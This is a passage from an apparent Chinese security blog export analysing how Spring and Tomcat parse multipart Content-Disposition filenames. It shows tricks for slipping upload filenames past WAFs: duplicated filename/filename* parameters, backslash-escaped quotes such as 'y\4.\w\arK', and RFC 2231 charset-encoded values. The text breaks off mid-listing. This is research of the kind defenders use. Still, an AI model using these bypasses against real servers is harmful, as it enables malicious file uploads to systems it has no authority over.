&#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候你的反应应该会和我一样，套中套之waf你猜猜我是谁</p><p><img src="/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/11.png"></p><p>当然我们也可以不要双引号，让waf哭去吧</p><p><img src="/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/12.png"></p><h3 id="Spring5"><a href="#Spring5" class="headerlink" title="Spring5"></a>Spring5</h3><p>同样是<code>springboot2.6.4</code>+<code>springframework5.3</code>，这里不去研究小版本间是否有差异只看看大版本了</p><h4 id="“双写”绕过"><a href="#“双写”绕过" class="headerlink" title="“双写”绕过"></a>“双写”绕过</h4><p>来看看核心部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ContentDisposition <span class="title">parse</span><span class="params">(String contentDisposition)</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; parts = tokenize(contentDisposition);</span><br><span class="line">    String type = (String)parts.get(<span class="number">0</span>);</span><br><span class="line">    String name = <span class="keyword">null</span>;</span><br><span class="line">    String filename = <span class="keyword">null</span>;</span><br><span class="line">    Charset charset = <span class="keyword">null</span>;</span><br><span class="line">    Long size = <span class="keyword">null</span>;</span><br><span class="line">    ZonedDateTime creationDate = <span class="keyword">null</span>;</span><br><span class="line">    ZonedDateTime modificationDate = <span class="keyword">null</span>;</span><br><span class="line">    ZonedDateTime readDate = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; parts.size(); ++i) &#123;</span><br><span class="line">        String part = (String)parts.get(i);</span><br><span class="line">        <span class="keyword">int</span> eqIndex = part.indexOf(<span class="number">61</span>);</span><br><span class="line">        <span class="keyword">if</span> (eqIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid content disposition format&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String attribute = part.substring(<span class="number">0</span>, eqIndex);</span><br><span class="line">        String value = part.startsWith(<span class="string">&quot;\&quot;&quot;</span>, eqIndex + <span class="number">1</span>) &amp;&amp; part.endsWith(<span class="string">&quot;\&quot;&quot;</span>) ? part.substring(eqIndex + <span class="number">2</span>, part.length() - <span class="number">1</span>) : part.substring(eqIndex + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (attribute.equals(<span class="string">&quot;name&quot;</span>)) &#123;</span><br><span class="line">            name = value;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!attribute.equals(<span class="string">&quot;filename*&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">//限制了如果为null才能赋值</span></span><br><span class="line">            <span class="keyword">if</span> (attribute.equals(<span class="string">&quot;filename&quot;</span>) &amp;&amp; filename == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (value.startsWith(<span class="string">&quot;=?&quot;</span>)) &#123;</span><br><span class="line">                    Matcher matcher = BASE64_ENCODED_PATTERN.matcher(value);</span><br><span class="line">                    <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">                        String match1 = matcher.group(<span class="number">1</span>);</span><br><span class="line">                        String match2 = matcher.group(<span class="number">2</span>);</span><br><span class="line">                        filename = <span class="keyword">new</span> String(Base64.getDecoder().decode(match2), Charset.forName(match1));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        filename = value;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filename = value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (attribute.equals(<span class="string">&quot;size&quot;</span>)) &#123;</span><br><span class="line">                size = Long.parseLong(value);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (attribute.equals(<span class="string">&quot;creation-date&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    creationDate = ZonedDateTime.parse(value, DateTimeFormatter.RFC_1123_DATE_TIME);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (DateTimeParseException var20) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (attribute.equals(<span class="string">&quot;modification-date&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    modificationDate = ZonedDateTime.parse(value, DateTimeFormatter.RFC_1123_DATE_TIME);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (DateTimeParseException var19) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (attribute.equals(<span class="string">&quot;read-date&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    readDate = ZonedDateTime.parse(value, DateTimeFormatter.RFC_1123_DATE_TIME);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (DateTimeParseException var18) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> idx1 = value.indexOf(<span class="number">39</span>);</span><br><span class="line">            <span class="keyword">int</span> idx2 = value.indexOf(<span class="number">39</span>, idx1 + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (idx1 != -<span class="number">1</span> &amp;&amp; idx2 != -<span class="number">1</span>) &#123;</span><br><span class="line">                charset = Charset.forName(value.substring(<span class="number">0</span>, idx1).trim());</span><br><span class="line">                Assert.isTrue(StandardCharsets.UTF_8.equals(charset) || StandardCharsets.ISO_8859_1.equals(charset), <span class="string">&quot;Charset should be UTF-8 or ISO-8859-1&quot;</span>);</span><br><span class="line">                filename = decodeFilename(value.substring(idx2 + <span class="number">1</span>), charset);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                filename = decodeFilename(value, StandardCharsets.US_ASCII);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ContentDisposition(type, name, filename, charset, size, creationDate, modificationDate, readDate);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>spring5当中又和spring4逻辑有区别，导致我们又可以”双写”绕过(至于为什么我要打引号可以看看我代码中的注释)，因此如果我们先传<code>filename=xxx</code>再传<code>filename*=xxx</code>，由于没有前面提到的<code>filename == null</code>的判断，造成可以覆盖<code>filename</code>的值</p><p><img src="/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/14.png"></p><p>同样我们全用<code>filename*</code>也可以实现双写绕过，和上面一个道理</p><p><img src="/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/15.png"></p><p>但由于这里indexof的条件变成了”=”号，而不像spring4那样的<code>filename=/filename=*</code>，毕竟indexof默认取第一个，造成不能像spring4那样做嵌套操作</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>探寻Tomcat文件上传流量层面绕waf新姿势</title>
      <link href="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/"/>
      <url>/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="探寻Tomcat文件上传流量层面绕waf新姿势"><a href="#探寻Tomcat文件上传流量层面绕waf新姿势" class="headerlink" title="探寻Tomcat文件上传流量层面绕waf新姿势"></a>探寻Tomcat文件上传流量层面绕waf新姿势</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>​    无意中看到ch1ng师傅的文章觉得很有趣，不得不感叹师傅太厉害了，但我一看那长篇的函数总觉得会有更骚的东西，所幸还真的有，借此机会就发出来一探究竟，同时也不得不感慨下RFC文档的妙处，当然本文针对的技术也仅仅只是在流量层面上waf的绕过</p><h2 id="Pre"><a href="#Pre" class="headerlink" title="Pre"></a>Pre</h2><p>很神奇对吧，当然这不是终点,接下来我们就来一探究竟</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/res.png"></p><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>这里简单说一下师傅的思路</p><p>部署与处理上传war的servlet是<code>org.apache.catalina.manager.HTMLManagerServlet</code></p><p>在文件上传时最终会通过处理<code>org.apache.catalina.manager.HTMLManagerServlet#upload</code></p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/1.png"></p><p>调用的是其子类实现类<code>org.apache.catalina.core.ApplicationPart#getSubmittedFileName</code></p><p>这里获取filename的时候的处理很有趣</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/2.png"></p><p>看到这段注释，发现在RFC 6266文档当中也提出这点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Avoid including the &quot;\&quot; character in the quoted-string form of the filename parameter, as escaping is not implemented by some user agents, and &quot;\&quot; can be considered an illegal path character.</span><br></pre></td></tr></table></figure><p>那么我们的tomcat是如何处理的嘞？这里它通过函数<code>HttpParser.unquote</code>去进行处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">unquote</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span> || input.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> input;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> start;</span><br><span class="line">        <span class="keyword">int</span> end;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Skip surrounding quotes if there are any</span></span><br><span class="line">        <span class="keyword">if</span> (input.charAt(<span class="number">0</span>) == <span class="string">&#x27;&quot;&#x27;</span>) &#123;</span><br><span class="line">            start = <span class="number">1</span>;</span><br><span class="line">            end = input.length() - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            start = <span class="number">0</span>;</span><br><span class="line">            end = input.length();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start ; i &lt; end; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = input.charAt(i);</span><br><span class="line">            <span class="keyword">if</span> (input.charAt(i) == <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">                result.append(input.charAt(i));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result.append(c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>简单做个总结如果首位是<code>&quot;</code>(前提条件是里面有<code>\</code>字符)，那么就会去掉跳过从第二个字符开始，并且末尾也会往前移动一位，同时会忽略字符<code>\</code>，师傅只提到了类似<code>test.\war</code>这样的例子</p><p>但其实根据这个我们还可以进一步构造一些看着比较恶心的比如<code>filename=&quot;&quot;y\4.\w\arK&quot;</code></p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/3.png"></p><h2 id="深入"><a href="#深入" class="headerlink" title="深入"></a>深入</h2><p>还是在<code>org.apache.catalina.core.ApplicationPart#getSubmittedFileName</code>当中，一看到这个将字符串转换成map的操作总觉得里面会有更骚的东西(这里先是解析传入的参数再获取，如果解析过程有利用点那么也会影响到后面参数获取)，不扯远继续回到正题</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/4.png"></p><p>首先它会获取header参数<code>Content-Disposition</code>当中的值，如果以<code>form-data</code>或者<code>attachment</code>开头就会进行我们的解析操作，跟进去一看果不其然，看到<code>RFC2231Utility</code>瞬间不困了</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/5.png"></p><p>后面这一坨就不必多说了，相信大家已经很熟悉啦支持QP编码，忘了的可以考古看看我之前写的文章<a href="https://y4tacker.github.io/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/">Java文件上传大杀器-绕waf(针对commons-fileupload组件)</a>，这里就不再重复这个啦，我们重点看三元运算符前面的这段</p><p>既然如此，我们先来看看这个hasEncodedValue判断标准是什么，字符串末尾是否带<code>*</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">hasEncodedValue</span><span class="params">(<span class="keyword">final</span> String paramName)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (paramName != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> paramName.lastIndexOf(<span class="string">&#x27;*&#x27;</span>) == (paramName.length() - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在看解密函数之前我们可以先看看<a href="https://datatracker.ietf.org/doc/html/rfc2231#section-4">RFC 2231</a>文档当中对此的描述，英文倒是很简单不懂的可以在线翻一下，这里就不贴中文了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Asterisks (&quot;*&quot;) are reused to provide the indicator that language and character set information is present and encoding is being used. A single quote (&quot;&#x27;&quot;) is used to delimit the character set and language information at the beginning of the parameter value. Percent signs (&quot;%&quot;) are used as the encoding flag, which agrees with RFC 2047.</span><br><span class="line">Specifically, an asterisk at the end of a parameter name acts as an indicator that character set and language information may appear at  the beginning of the parameter value. A single quote is used to separate the character set, language, and actual value information in the parameter value string, and an percent sign is used to flag octets encoded in hexadecimal.  For example:</span><br><span class="line">Content-Type: application/x-stuff;</span><br><span class="line">         title*=us-ascii&#x27;en-us&#x27;This%20is%20%2A%2A%2Afun%2A%2A%2A</span><br></pre></td></tr></table></figure><p>接下来回到正题，我们继续看看这个解码做了些什么</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decodeText</span><span class="params">(<span class="keyword">final</span> String encodedText)</span> <span class="keyword">throws</span> UnsupportedEncodingException </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">int</span> langDelimitStart = encodedText.indexOf(<span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (langDelimitStart == -<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// missing charset</span></span><br><span class="line">    <span class="keyword">return</span> encodedText;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">final</span> String mimeCharset = encodedText.substring(<span class="number">0</span>, langDelimitStart);</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">int</span> langDelimitEnd = encodedText.indexOf(<span class="string">&#x27;\&#x27;&#x27;</span>, langDelimitStart + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (langDelimitEnd == -<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// missing language</span></span><br><span class="line">    <span class="keyword">return</span> encodedText;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">byte</span>[] bytes = fromHex(encodedText.substring(langDelimitEnd + <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> String(bytes, getJavaCharset(mimeCharset));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合注释可以看到标准格式<code>@param encodedText - Text to be decoded has a format of &#123;@code &lt;charset&gt;&#39;&lt;language&gt;&#39;&lt;encoded_value&gt;&#125;</code>,分别是编码，语言和待解码的字符串，同时这里还适配了对url编码的解码，也就是<code>fromHex</code>函数,具体代码如下，其实就是url解码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] fromHex(<span class="keyword">final</span> String text) &#123;</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">int</span> shift = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">final</span> ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream(text.length());</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; text.length();) &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">char</span> c = text.charAt(i++);</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (i &gt; text.length() - <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// unterminated sequence</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">byte</span> b1 = HEX_DECODE[text.charAt(i++) &amp; MASK];</span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">byte</span> b2 = HEX_DECODE[text.charAt(i++) &amp; MASK];</span><br><span class="line">      out.write((b1 &lt;&lt; shift) | b2);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      out.write((<span class="keyword">byte</span>) c);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们将值当中值得注意的点梳理一下</p><ol><li>支持编码的解码</li><li>值当中可以进行url编码</li><li>@code&lt;charset&gt;&#39;&lt;language&gt;&#39;&lt;encoded_value&gt; 中间这位language可以随便写，代码里没有用到这个的处理</li></ol><p>既然如此那么我们首先就可以排出掉utf-8，毕竟这个解码后就直接是明文，从Java标准库当中的charsets.jar可以看出，支持的编码有很多</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/6.png"></p><p>同时通过简单的代码也可以输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Locale locale = Locale.getDefault();</span><br><span class="line">Map&lt;String, Charset&gt; maps = Charset.availableCharsets();</span><br><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">sb.append(<span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Charset&gt; entry : maps.entrySet()) &#123;</span><br><span class="line">  String key = entry.getKey();</span><br><span class="line">  Charset value = entry.getValue();</span><br><span class="line">  sb.append(<span class="string">&quot;\&quot;&quot;</span> + key + <span class="string">&quot;\&quot;,&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">sb.deleteCharAt(sb.length() - <span class="number">1</span>);</span><br><span class="line">sb.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">System.out.println(sb.toString());</span><br></pre></td></tr></table></figure><p>运行输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//res</span></span><br><span class="line">&#123;<span class="string">&quot;Big5&quot;</span>,<span class="string">&quot;Big5-HKSCS&quot;</span>,<span class="string">&quot;CESU-8&quot;</span>,<span class="string">&quot;EUC-JP&quot;</span>,<span class="string">&quot;EUC-KR&quot;</span>,<span class="string">&quot;GB18030&quot;</span>,<span class="string">&quot;GB2312&quot;</span>,<span class="string">&quot;GBK&quot;</span>,<span class="string">&quot;IBM-Thai&quot;</span>,<span class="string">&quot;IBM00858&quot;</span>,<span class="string">&quot;IBM01140&quot;</span>,<span class="string">&quot;IBM01141&quot;</span>,<span class="string">&quot;IBM01142&quot;</span>,<span class="string">&quot;IBM01143&quot;</span>,<span class="string">&quot;IBM01144&quot;</span>,<span class="string">&quot;IBM01145&quot;</span>,<span class="string">&quot;IBM01146&quot;</span>,<span class="string">&quot;IBM01147&quot;</span>,<span class="string">&quot;IBM01148&quot;</span>,<span class="string">&quot;IBM01149&quot;</span>,<span class="string">&quot;IBM037&quot;</span>,<span class="string">&quot;IBM1026&quot;</span>,<span class="string">&quot;IBM1047&quot;</span>,<span class="string">&quot;IBM273&quot;</span>,<span class="string">&quot;IBM277&quot;</span>,<span class="string">&quot;IBM278&quot;</span>,<span class="string">&quot;IBM280&quot;</span>,<span class="string">&quot;IBM284&quot;</span>,<span class="string">&quot;IBM285&quot;</span>,<span class="string">&quot;IBM290&quot;</span>,<span class="string">&quot;IBM297&quot;</span>,<span class="string">&quot;IBM420&quot;</span>,<span class="string">&quot;IBM424&quot;</span>,<span class="string">&quot;IBM437&quot;</span>,<span class="string">&quot;IBM500&quot;</span>,<span class="string">&quot;IBM775&quot;</span>,<span class="string">&quot;IBM850&quot;</span>,<span class="string">&quot;IBM852&quot;</span>,<span class="string">&quot;IBM855&quot;</span>,<span class="string">&quot;IBM857&quot;</span>,<span class="string">&quot;IBM860&quot;</span>,<span class="string">&quot;IBM861&quot;</span>,<span class="string">&quot;IBM862&quot;</span>,<span class="string">&quot;IBM863&quot;</span>,<span class="string">&quot;IBM864&quot;</span>,<span class="string">&quot;IBM865&quot;</span>,<span class="string">&quot;IBM866&quot;</span>,<span class="string">&quot;IBM868&quot;</span>,<span class="string">&quot;IBM869&quot;</span>,<span class="string">&quot;IBM870&quot;</span>,<span class="string">&quot;IBM871&quot;</span>,<span class="string">&quot;IBM918&quot;</span>,<span class="string">&quot;ISO-2022-CN&quot;</span>,<span class="string">&quot;ISO-2022-JP&quot;</span>,<span class="string">&quot;ISO-2022-JP-2&quot;</span>,<span class="string">&quot;ISO-2022-KR&quot;</span>,<span class="string">&quot;ISO-8859-1&quot;</span>,<span class="string">&quot;ISO-8859-13&quot;</span>,<span class="string">&quot;ISO-8859-15&quot;</span>,<span class="string">&quot;ISO-8859-2&quot;</span>,<span class="string">&quot;ISO-8859-3&quot;</span>,<span class="string">&quot;ISO-8859-4&quot;</span>,<span class="string">&quot;ISO-8859-5&quot;</span>,<span class="string">&quot;ISO-8859-6&quot;</span>,<span class="string">&quot;ISO-8859-7&quot;</span>,<span class="string">&quot;ISO-8859-8&quot;</span>,<span class="string">&quot;ISO-8859-9&quot;</span>,<span 